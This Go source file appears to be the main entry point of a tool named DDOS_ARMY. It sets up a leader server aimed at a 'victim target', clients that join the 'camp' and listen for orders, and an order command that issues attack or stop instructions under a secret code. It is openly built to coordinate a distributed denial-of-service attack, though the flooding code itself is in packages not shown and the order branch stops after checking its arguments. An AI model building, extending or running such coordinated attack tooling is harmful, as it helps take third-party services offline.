package main

import (
	"DDOS_ARMY/camp"
	"DDOS_ARMY/client"
	"DDOS_ARMY/server"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"os"
	"time"
)

func main() {
	var serverListenHost, serverTargetHost, serverLeaderName string
	var clientConnectHost, clientName string
	var orderConnectHost, orderSecretCode, orderOrder string

	serverCmd := flag.NewFlagSet("server", flag.ExitOnError)
	serverCmd.StringVar(&serverListenHost, "l", "0.0.0.0", "listening host")
	serverCmd.StringVar(&serverListenHost, "listen", "0.0.0.0", "listening host")
	serverCmd.StringVar(&serverTargetHost, "t", "", "victim target")
	serverCmd.StringVar(&serverTargetHost, "target", "", "victim target")
	serverCmd.StringVar(&serverLeaderName, "n", "#Sir Jeo", "leader name")
	serverCmd.StringVar(&serverLeaderName, "name", "#Sir Jeo", "leader name")

	clientCmd := flag.NewFlagSet("client", flag.ExitOnError)
	clientCmd.StringVar(&clientConnectHost, "c", "", "host to connect to")
	clientCmd.StringVar(&clientConnectHost, "connect", "", "host to connect to")
	clientCmd.StringVar(&clientName, "n", client.GetHostName(), "name of machine")
	clientCmd.StringVar(&clientName, "name", client.GetHostName(), "name of machine")

	orderCmd := flag.NewFlagSet("order", flag.ExitOnError)
	orderCmd.StringVar(&orderConnectHost, "c", "", "host to connect to")
	orderCmd.StringVar(&orderConnectHost, "connect", "", "host to connect to")
	orderCmd.StringVar(&orderSecretCode, "s", "", "leader authorization code")
	orderCmd.StringVar(&orderSecretCode, "secret", "", "leader authorization code")
	orderCmd.StringVar(&orderOrder, "o", "", "order (attack/a, stop/s, nothing/n)")
	orderCmd.StringVar(&orderOrder, "order", "", "order (attack/a, stop/s, nothing/n)")

	if len(os.Args) < 2 {
		client.PrintUsage()
		os.Exit(1)
	}

	switch os.Args[1] {

	case "server":
		serverCmd.Parse(os.Args[2:])
		if serverTargetHost == "" {
			color.Red("Error: missing mandatory argument: target")
			serverCmd.Usage()
			os.Exit(1)
		}
		// start new server
		camp.NewCamp(serverLeaderName, serverTargetHost)
		client.PrintBanner()
		server.StartServer(serverListenHost, "8080")

	case "client":
		clientCmd.Parse(os.Args[2:])
		if clientConnectHost == "" {
			color.Red("Error: missing mandatory argument: connect")
			clientCmd.Usage()
			os.Exit(1)
		}

		// start new client

		cl := client.NewClient(clientName, &http.Client{Transport: &http.Transport{MaxIdleConns: 1}}, clientConnectHost)

		_, err := cl.Ping()
		if err != nil {
			color.Red("You can't join the camp, the leader server is not available")
			os.Exit(1)
		}

		cl.JoinCamp()

		var prevCamp camp.Camp
		go func() {
			for {
				i, err := cl.GetCampInfo()
				if err != nil {
					color.Red("You can't get the camp info, the leader server is not available")
					os.Exit(1)
				}
				cp := client.MapToCampInfo(i.(map[string]interface{}))
				if !cp.Equals(prevCamp) {
					//clear the screen
					fmt.Print("\033[H\033[2J")
					client.PrintBanner()
					client.DisplayCampInfo(cp)
					prevCamp = cp
				}
				time.Sleep(3 * time.Second)
			}

		}()

		cl.ListenToOrders()

	case "order":
		orderCmd.Parse(os.Args[2:])
		if orderConnectHost == "" {
			color.Red("Error: missing mandatory argument: connect")
			orderCmd.Usage()
			os.Exit(1)
		}
		if orderSecretCode == "" {
			color.Red("Error: missing mandatory argument: secret")
			orderCmd.Usage()
			os.Exit(1)
		}
		if orderOrder == "" {
			color.Red("Error: missing mandatory argument: order")
			orderCmd.Usage()
			os.Exit(1)
		}
		if orderOrder != "ATTACK" && orderOrder != "A" && orderOrder != "STOP" && orderOrder != "S" && orderOrder != "NOTHING" && orderOrder != "N" {
			color.Red("Error: invalid order: %s", orderOrder)
			orderCmd.Usage()
			os.Exit(1)
		}

	}
}
